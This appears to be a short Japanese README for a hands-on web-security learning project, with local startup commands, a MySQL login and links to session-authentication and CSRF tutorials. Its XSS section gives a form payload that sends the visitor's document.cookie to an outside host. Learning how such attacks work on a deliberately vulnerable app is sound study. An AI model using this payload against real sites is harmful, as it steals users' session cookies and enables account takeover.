## 起動

```
npx nodemon index.js
```

```
dc up -d
dc exec mysql /bin/bash 
mysql -uroot -ptest
show databases;
use test;
show tables;

+-------------------+
| Tables_in_test_db |
+-------------------+
| users             |
+-------------------+

```

## XSS

以下をフォームに入れて送信する
```
<script type='text/javascript'>document.location='https://www.google.com?cookie=' + document.cookie;</script>
```

## 認証方法

[Session Authentication](https://roadmap.sh/guides/session-authentication)

## 参考
[GoogleDoc](https://docs.google.com/document/d/1aWrifF9T9D7zEKrgalbekyStfXt0jegCnjblqRCkxFY/edit#)
[脆弱なサイトと罠サイトを実際に作って学ぶ『CSRF』とその対策](https://www.hypertextcandy.com/csrf-hands-on-tutorial)
[ホワイトハッカーへの道　三歩目](https://qiita.com/ichimura/items/e91df821a32aefa21bda)
